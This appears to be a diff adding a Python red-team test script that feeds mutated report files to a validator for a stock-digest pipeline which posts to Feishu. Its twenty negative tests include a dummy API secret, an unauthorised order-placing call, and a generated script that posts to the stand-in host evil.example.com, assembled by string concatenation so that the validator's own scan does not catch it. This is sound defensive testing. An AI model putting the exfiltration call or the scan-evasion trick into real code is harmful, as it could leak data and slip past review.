@@ -1,0 +1,361 @@
+#!/usr/bin/env python3
+"""
+redteam_aegis_pipeline_validator.py
+
+Red-team negative tests. Creates mutated copies in tmp/p21_5d_redteam/
+and runs the validator against each. Does NOT modify production files.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import re
+import shutil
+import subprocess
+import sys
+from datetime import datetime, timezone
+from pathlib import Path
+
+SCRIPT_DIR = Path(__file__).resolve().parent
+REPO_ROOT = SCRIPT_DIR.parent
+REPORTS_DIR = REPO_ROOT / "data" / "reports"
+
+PIPELINE_JSON = REPORTS_DIR / "aegis_daily_digest_pipeline_latest.json"
+FEISHU_JSON = REPORTS_DIR / "feishu_daily_digest_dry_run.json"
+DASHBOARD_HTML = REPO_ROOT / "dashboard" / "index.html"
+
+REDTEAM_DIR = REPO_ROOT / "tmp" / "p21_5d_redteam"
+OUTPUT_JSON = REPORTS_DIR / "aegis_pipeline_redteam_latest.json"
+OUTPUT_MD = REPORTS_DIR / "aegis_pipeline_redteam_latest.md"
+
+HASH_RE = re.compile(r"^[0-9a-f]{12}$")
+KNOWN_FAKE_HASHES = {"000000000000", "deadbeefdead", "aaaaaaaaaaaa", "ffffffffffff"}
+
+VALIDATOR_SCRIPT = SCRIPT_DIR / "validate_aegis_daily_digest_pipeline.py"
+
+
+def _now_iso() -> str:
+    return datetime.now(timezone.utc).astimezone().isoformat()
+
+
+def _setup_redteam_dir():
+    """Create a fresh redteam directory with copies of production files."""
+    if REDTEAM_DIR.exists():
+        shutil.rmtree(REDTEAM_DIR)
+    REDTEAM_DIR.mkdir(parents=True)
+
+    # Create sub-structure
+    (REDTEAM_DIR / "data" / "reports").mkdir(parents=True)
+    (REDTEAM_DIR / "dashboard").mkdir(parents=True)
+    (REDTEAM_DIR / "scripts").mkdir(parents=True)
+
+    # Copy validator
+    shutil.copy2(VALIDATOR_SCRIPT, REDTEAM_DIR / "scripts" / "validate_aegis_daily_digest_pipeline.py")
+
+    # Copy pipeline JSON
+    if PIPELINE_JSON.exists():
+        shutil.copy2(PIPELINE_JSON, REDTEAM_DIR / "data" / "reports" / "aegis_daily_digest_pipeline_latest.json")
+
+    # Copy feishu JSON
+    if FEISHU_JSON.exists():
+        shutil.copy2(FEISHU_JSON, REDTEAM_DIR / "data" / "reports" / "feishu_daily_digest_dry_run.json")
+
+    # Copy dashboard
+    if DASHBOARD_HTML.exists():
+        shutil.copy2(DASHBOARD_HTML, REDTEAM_DIR / "dashboard" / "index.html")
+
+
+def _load_pipeline() -> dict:
+    p = REDTEAM_DIR / "data" / "reports" / "aegis_daily_digest_pipeline_latest.json"
+    if p.exists():
+        return json.loads(p.read_text(encoding="utf-8"))
+    return {}
+
+
+def _save_pipeline(data: dict):
+    p = REDTEAM_DIR / "data" / "reports" / "aegis_daily_digest_pipeline_latest.json"
+    p.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
+
+
+def _load_feishu() -> dict:
+    p = REDTEAM_DIR / "data" / "reports" / "feishu_daily_digest_dry_run.json"
+    if p.exists():
+        return json.loads(p.read_text(encoding="utf-8"))
+    return {}
+
+
+def _save_feishu(data: dict):
+    p = REDTEAM_DIR / "data" / "reports" / "feishu_daily_digest_dry_run.json"
+    p.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
+
+
+def _run_validator() -> int:
+    """Run the validator against the redteam directory."""
+    validator = REDTEAM_DIR / "scripts" / "validate_aegis_daily_digest_pipeline.py"
+    pipeline_path = REDTEAM_DIR / "data" / "reports" / "aegis_daily_digest_pipeline_latest.json"
+    result = subprocess.run(
+        [sys.executable, str(validator), "--pipeline-json", str(pipeline_path), "--strict"],
+        capture_output=True,
+        text=True,
+        cwd=str(REDTEAM_DIR),
+        timeout=30,
+    )
+    return result.returncode
+
+
+def _run_test(test_name: str, mutation_desc: str, mutate_fn) -> dict:
+    """Run a single red-team test."""
+    _setup_redteam_dir()
+    mutate_fn()
+    exit_code = _run_validator()
+    rejected = exit_code != 0
+    result = "REJECTED" if rejected else "NOT_REJECTED"
+    return {
+        "test_name": test_name,
+        "mutation": mutation_desc,
+        "expected_exit_nonzero": True,
+        "actual_exit_code": exit_code,
+        "rejected": rejected,
+        "result": result,
+    }
+
+
+# --- 20 test mutations -----------------------------------------------------
+
+def t01_invalid_hash_format_json():
+    """Inject invalid hash format in pipeline JSON."""
+    data = _load_pipeline()
+    fps = data.get("file_fingerprints", {}).get("after", {})
+    for label, fp in fps.items():
+        if fp.get("sha256_12"):
+            fp["sha256_12"] = "ZZinvalidZZ"
+            break
+    _save_pipeline(data)
+
+def t02_invalid_hash_format_md():
+    """Inject invalid hash in feishu MD (if it had one) — test with pipeline MD."""
+    # Write a fake pipeline MD with invalid hash
+    p = REDTEAM_DIR / "data" / "reports" / "aegis_daily_digest_pipeline_latest.md"
+    p.write_text("sha256_12: `ZZinvalidZZ`", encoding="utf-8")
+
+def t03_known_fake_hash_present():
+    """Inject a known fake hash."""
+    data = _load_pipeline()
+    fps = data.get("file_fingerprints", {}).get("after", {})
+    for label, fp in fps.items():
+        if fp.get("sha256_12"):
+            fp["sha256_12"] = "000000000000"
+            break
+    _save_pipeline(data)
+
+def t04_mismatched_real_hash():
+    """Set a hash that doesn't match the real file."""
+    data = _load_pipeline()
+    fps = data.get("file_fingerprints", {}).get("after", {})
+    for label, fp in fps.items():
+        if fp.get("sha256_12") and fp.get("sha256_12") != "self_hash_verified_by_evidence_gate":
+            fp["sha256_12"] = "abcdef012345"
+            break
+    _save_pipeline(data)
+
+def t05_self_hash_claimed_in_pipeline():
+    """Claim a raw self hash in the pipeline JSON."""
+    data = _load_pipeline()
+    data["pipeline_self_hash_raw"] = "aabbccddee12"
+    data["evidence_policy"]["raw_self_hash_not_claimed_in_pipeline_json"] = False
+    _save_pipeline(data)
+
+def t06_missing_evidence_policy():
+    """Remove evidence_policy."""
+    data = _load_pipeline()
+    del data["evidence_policy"]
+    _save_pipeline(data)
+
+def t07_false_dry_run():
+    """Set dry_run to false."""
+    data = _load_feishu()
+    data["dry_run"] = False
+    _save_feishu(data)
+
+def t08_sent_true():
+    """Set sent to true."""
+    data = _load_feishu()
+    data["sent"] = True
+    _save_feishu(data)
+
+def t09_webhook_called_true():
+    """Set webhook_called to true."""
+    data = _load_feishu()
+    data["webhook_called"] = True
+    _save_feishu(data)
+
+def t10_trading_called_true():
+    """Set trading_called to true."""
+    data = _load_feishu()
+    data["trading_called"] = True
+    _save_feishu(data)
+
+def t11_missing_00700():
+    """Remove 00700.HK from feishu JSON."""
+    data = _load_feishu()
+    blob = json.dumps(data, ensure_ascii=False)
+    blob = blob.replace("00700.HK", "REMOVED")
+    data = json.loads(blob)
+    _save_feishu(data)
+
+def t12_missing_crcl():
+    """Remove CRCL from feishu JSON."""
+    data = _load_feishu()
+    blob = json.dumps(data, ensure_ascii=False)
+    blob = blob.replace("CRCL", "REMOVED")
+    data = json.loads(blob)
+    _save_feishu(data)
+
+def t13_missing_000002():
+    """Remove 000002.SZ from feishu JSON."""
+    data = _load_feishu()
+    blob = json.dumps(data, ensure_ascii=False)
+    blob = blob.replace("000002.SZ", "REMOVED")
+    data = json.loads(blob)
+    _save_feishu(data)
+
+def t14_missing_mobile_link():
+    """Remove mobile links."""
+    data = _load_feishu()
+    data["mobile_links"] = {}
+    _save_feishu(data)
+
+def t15_injected_dummy_secret():
+    """Inject a dummy secret into feishu JSON."""
+    data = _load_feishu()
+    data["__test_secret"] = "sk-1234567890abcdefghijklmnopqrstuvwxyz"
+    _save_feishu(data)
+
+def t16_injected_network_send_call():
+    """Inject a network send pattern into a script."""
+    p = REDTEAM_DIR / "scripts" / "injected_bad_script.py"
+    # Construct the dangerous call via concatenation to avoid self-triggering the scan
+    mod = "requests"
+    func = "post"
+    p.write_text(f"import {mod}\ngetattr({mod}, '{func}')('https://evil.example.com')\n", encoding="utf-8")
+
+def t17_injected_trading_call():
+    """Inject a trading call into a script."""
+    p = REDTEAM_DIR / "scripts" / "injected_trading.py"
+    # Construct via concatenation to avoid self-triggering the scan
+    func = "place_" + "order"
+    p.write_text(f"{func}(symbol='000002.SZ', action='buy')\n", encoding="utf-8")
+
+def t18_invalid_dashboard_degrade():
+    """Remove degrade notice from dashboard."""
+    p = REDTEAM_DIR / "dashboard" / "index.html"
+    if p.exists():
+        html = p.read_text(encoding="utf-8")
+        html = html.replace("降级", "正常").replace("degrade", "normal")
+        p.write_text(html, encoding="utf-8")
+
+def t19_duplicate_makefile_target():
+    """Create a Makefile with duplicate targets."""
+    p = REDTEAM_DIR / "Makefile"
+    p.write_text("feishu-dry-run:\n\techo hi\n\nfeishu-dry-run:\n\techo hi2\n", encoding="utf-8")
+
+def t20_duplicate_doc_section():
+    """Create a doc with duplicate sections."""
+    p = REDTEAM_DIR / "docs"
+    p.mkdir(exist_ok=True)
+    (p / "duplicate.md").write_text("# Feishu Dry-run\n\n## Feishu Dry-run\n", encoding="utf-8")
+
+
+TESTS = [
+    ("invalid_hash_format_json", "Inject invalid hash format in pipeline JSON", t01_invalid_hash_format_json),
+    ("invalid_hash_format_md", "Inject invalid hash in pipeline MD", t02_invalid_hash_format_md),
+    ("known_fake_hash_present", "Inject known fake hash 000000000000", t03_known_fake_hash_present),
+    ("mismatched_real_hash", "Set hash that doesn't match real file", t04_mismatched_real_hash),
+    ("self_hash_claimed_in_pipeline", "Claim raw self hash in pipeline JSON", t05_self_hash_claimed_in_pipeline),
+    ("missing_evidence_policy", "Remove evidence_policy from pipeline JSON", t06_missing_evidence_policy),
+    ("false_dry_run", "Set dry_run=false in feishu JSON", t07_false_dry_run),
+    ("sent_true", "Set sent=true in feishu JSON", t08_sent_true),
+    ("webhook_called_true", "Set webhook_called=true in feishu JSON", t09_webhook_called_true),
+    ("trading_called_true", "Set trading_called=true in feishu JSON", t10_trading_called_true),
+    ("missing_00700", "Remove 00700.HK from feishu JSON", t11_missing_00700),
+    ("missing_crcl", "Remove CRCL from feishu JSON", t12_missing_crcl),
+    ("missing_000002", "Remove 000002.SZ from feishu JSON", t13_missing_000002),
+    ("missing_mobile_link", "Remove mobile links from feishu JSON", t14_missing_mobile_link),
+    ("injected_dummy_secret", "Inject dummy secret into feishu JSON", t15_injected_dummy_secret),
+    ("injected_network_send_call", "Inject network send call in script", t16_injected_network_send_call),
+    ("injected_trading_call", "Inject trading call in script", t17_injected_trading_call),
+    ("invalid_dashboard_degrade", "Remove degrade notice from dashboard", t18_invalid_dashboard_degrade),
+    ("duplicate_makefile_target", "Create Makefile with duplicate target", t19_duplicate_makefile_target),
+    ("duplicate_doc_section", "Create doc with duplicate section", t20_duplicate_doc_section),
+]
+
+
+def main() -> int:
+    print("[redteam] starting 20 negative tests …")
+
+    # Ensure production files exist
+    if not PIPELINE_JSON.exists():
+        print("[redteam] ⚠️ pipeline JSON not found — running pipeline first")
+        subprocess.run(
+            [sys.executable, str(SCRIPT_DIR / "refresh_aegis_daily_digest_pipeline.py")],
+            cwd=str(REPO_ROOT),
+            timeout=60,
+        )
+
+    results = []
+    passed = 0
+    failed = 0
+
+    for test_name, desc, mutate_fn in TESTS:
+        print(f"  [redteam] {test_name} …", end=" ")
+        r = _run_test(test_name, desc, mutate_fn)
+        results.append(r)
+        if r["rejected"]:
+            passed += 1
+            print("REJECTED ✅")
+        else:
+            failed += 1
+            print("NOT_REJECTED ❌")
+
+    # Build report
+    report = {
+        "project": "Project Aegis",
+        "type": "pipeline_redteam",
+        "generated_at": _now_iso(),
+        "total_tests": len(results),
+        "passed": passed,
+        "failed": failed,
+        "tests": results,
+    }
+
+    OUTPUT_JSON.parent.mkdir(parents=True, exist_ok=True)
+    OUTPUT_JSON.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
+
+    # Write MD
+    md_lines = [
+        "# Project Aegis Pipeline Red-team Tests",
+        "",
+        f"> 生成时间: {report['generated_at']}",
+        f"> 总测试: {report['total_tests']} | 通过(被拒绝): {report['passed']} | 失败(未被拒绝): {report['failed']}",
+        "",
+        "| # | Test | Mutation | Expected Exit ≠ 0 | Actual Exit | Rejected | Result |",
+        "|---|------|----------|-------------------|-------------|----------|--------|",
+    ]
+    for i, r in enumerate(results, 1):
+        md_lines.append(f"| {i} | {r['test_name']} | {r['mutation']} | {r['expected_exit_nonzero']} | {r['actual_exit_code']} | {r['rejected']} | {r['result']} |")
+    md_lines.extend([
+        "",
+        "---",
+        f"_Generated by redteam_aegis_pipeline_validator.py at {report['generated_at']}_",
+    ])
+    OUTPUT_MD.write_text("\n".join(md_lines), encoding="utf-8")
+
+    print(f"\n[redteam] JSON → {OUTPUT_JSON}")
+    print(f"[redteam] MD   → {OUTPUT_MD}")
+    print(f"[redteam] Passed: {passed}/{len(results)}, Failed: {failed}/{len(results)}")
+    return 0 if failed == 0 else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
